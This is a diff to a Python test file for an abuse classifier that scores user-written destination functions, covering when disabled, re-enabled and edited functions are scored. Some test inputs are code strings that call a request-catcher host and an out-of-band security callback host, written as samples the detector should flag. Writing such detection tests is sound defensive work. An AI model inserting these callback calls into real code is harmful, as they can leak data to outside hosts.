@@ -2,6 +2,8 @@ import json
 from datetime import timedelta
 from typing import Any
 
+from unittest.mock import patch
+
 from django.utils import timezone
 
 import httpx
@@ -108,6 +110,15 @@ class TestAbuseClassification(AbuseClassificationTestCase):
                 {"alert_threshold": 0.9, "block_threshold": 0.95},
                 "fetch('https://webhook.site/0000')",
                 ["request_catcher"],
+                True,
+                False,
+            ),
+            (
+                "security_callback_alerts_without_blocking",
+                SCORES,
+                {"alert_threshold": 0.9, "block_threshold": 0.95},
+                "fetch('https://probe.oast.fun/')",
+                ["security_callback"],
                 True,
                 False,
             ),
@@ -612,6 +623,7 @@ class TestAbuseClassification(AbuseClassificationTestCase):
         [
             ("name_only", {"name": "Renamed"}, 1),
             ("code", {"hog": "print('changed')"}, 2),
+            ("disabling_a_scored_function", {"enabled": False}, 1),
             (
                 "secret_rotated_to_a_benign_value",
                 {
@@ -659,6 +671,7 @@ class TestAbuseClassification(AbuseClassificationTestCase):
             hog_function.save()
 
         assert len(self.gateway.requests) == expected_requests
+        assert len(self.captured_events()) == expected_requests
 
     @parameterized.expand(
         [
@@ -712,7 +725,6 @@ class TestAbuseClassification(AbuseClassificationTestCase):
             ("site_destination", True, None, {"type": "site_destination"}),
             ("internal_destination", True, None, {"type": "internal_destination"}),
             ("deleted", True, None, {"deleted": True}),
-            ("disabled", True, None, {"enabled": False}),
         ]
     )
     def test_nothing_is_classified(
@@ -757,14 +769,38 @@ class TestAbuseClassification(AbuseClassificationTestCase):
         assert len(self.gateway.requests) == 2
         assert "risk_score" in self.captured_events()[-1]["properties"]
 
-    def test_enabling_a_function_that_was_never_scored_scores_it(self) -> None:
+    def test_a_disabled_save_is_scored_and_enabling_it_reports_again(self) -> None:
         hog_function = self.create_destination(enabled=False)
 
         hog_function.enabled = True
         with self.committed():
             hog_function.save()
 
-        assert len(self.gateway.requests) == 1
+        assert len(self.gateway.requests) == 2
+        assert [event["properties"]["enabled"] for event in self.captured_events()] == [False, True]
+
+    @parameterized.expand(
+        [
+            ("disabled_again", {}, [False, True]),
+            ("edited_and_disabled_again", {"hog": "print('other')"}, [False, False]),
+        ]
+    )
+    def test_an_enable_is_reported_for_its_content_when_tasks_run_after_a_later_disable(
+        self, _name: str, later_changes: dict[str, Any], reported_enabled: list[bool]
+    ) -> None:
+        hog_function = self.create_destination(enabled=False)
+        queued: list[dict[str, Any]] = []
+
+        with patch.object(classify_hog_function_for_abuse, "delay", side_effect=lambda **task: queued.append(task)):
+            for changes in ({"enabled": True}, {"enabled": False, **later_changes}):
+                for field, value in changes.items():
+                    setattr(hog_function, field, value)
+                with self.committed():
+                    hog_function.save()
+        for task in queued:
+            classify_hog_function_for_abuse(**task)
+
+        assert [event["properties"]["enabled"] for event in self.captured_events()] == reported_enabled
 
     @parameterized.expand(
         [
